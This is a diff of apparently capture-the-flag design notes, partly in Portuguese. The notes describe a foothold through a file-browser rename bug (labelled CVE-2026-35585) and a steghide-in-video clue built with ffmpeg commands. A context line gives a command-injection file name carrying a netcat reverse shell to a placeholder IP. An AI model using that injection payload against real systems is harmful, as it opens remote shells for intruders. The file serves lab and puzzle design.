@@ -154,6 +154,22 @@ steghide flowers in richman
 ## foothold: CVE-2026-35585  no file-browser
 - rename um arquivo pra `; nc <IP> 4444 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)
 
+CLUE
+- download rich_man.mkv, extract audio, run steghide w rockyou (supernovaflyingbakekang )
+- decode base64 string into `sh -c "echo this old filename has been changed and is now deprecated: \$FILE"` this is ran after every rename
+
+reverses this
+```
+ffmpeg -i rich_man_trailer.mp4 -an -c:v copy rich_man.mp4
+ffmpeg -i rich_man_trailer.mp4 -vn -acodec pcm_s16le audio.wav
+steghide embed -cf audio.wav -ef foothold_b64.txt -p supernovaflyingbakekang
+ffmpeg -i rich_man.mp4 -i audio.wav \
+    -c:v copy \
+    -c:a pcm_s16le \
+    rich_man.mkv
+```
+
+cat whats_happenning.txt >> rich_man.mkv
 
 ## PE
 after login as supernova 
